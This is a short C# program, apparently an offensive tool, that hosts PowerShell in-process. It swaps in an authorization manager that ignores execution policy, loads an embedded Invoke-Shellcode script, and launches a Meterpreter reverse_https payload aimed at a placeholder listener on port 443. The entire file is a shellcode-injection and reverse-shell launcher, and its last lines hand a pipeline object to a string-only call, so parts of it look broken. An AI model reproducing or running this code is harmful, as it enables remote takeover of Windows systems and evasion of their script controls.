using System;
using System.Text;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace pup
{
    class Program
    {
        public static void Main()
        {
        StringBuilder shortPath = new StringBuilder(255);

            //Init stuff
            InitialSessionState initial = InitialSessionState.CreateDefault();
            // Replace PSAuthorizationManager with a null manager which ignores execution policy
            initial.AuthorizationManager = new System.Management.Automation.AuthorizationManager("MyShellId");
            Runspace runspace = RunspaceFactory.CreateRunspace(initial);
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            //Add commands
            pipeline.Commands.AddScript(Resources.Invoke_Shellcode());
            pipeline.Commands.AddScript("Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 127.0.0.1 -Lport 443 -force");                
            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();    

            PowerShell ps = PowerShell.Create();
            ps.AddScript(pipeline).Invoke();
            }
    }
}
